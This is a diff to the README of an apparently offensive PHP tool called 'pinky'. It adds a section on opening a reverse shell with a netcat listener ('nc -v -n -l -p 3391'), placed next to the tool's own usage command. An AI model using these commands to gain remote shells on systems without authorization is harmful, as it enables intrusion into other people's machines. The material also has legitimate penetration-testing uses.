@@ -28,3 +28,11 @@ $ php pinky.php -a 127.0.0.1 -p 3391 -t tcp
 **URL**
 
 ![pinky url](https://github.com/davidtavarez/pinky/blob/master/pinky_url.png?raw=true "URL")
+
+### Using netcat (nc) ###
+
+Also you can open the reverse shell with the **nc** command, like this.
+
+```
+$ nc -v -n -l -p 3391
+```
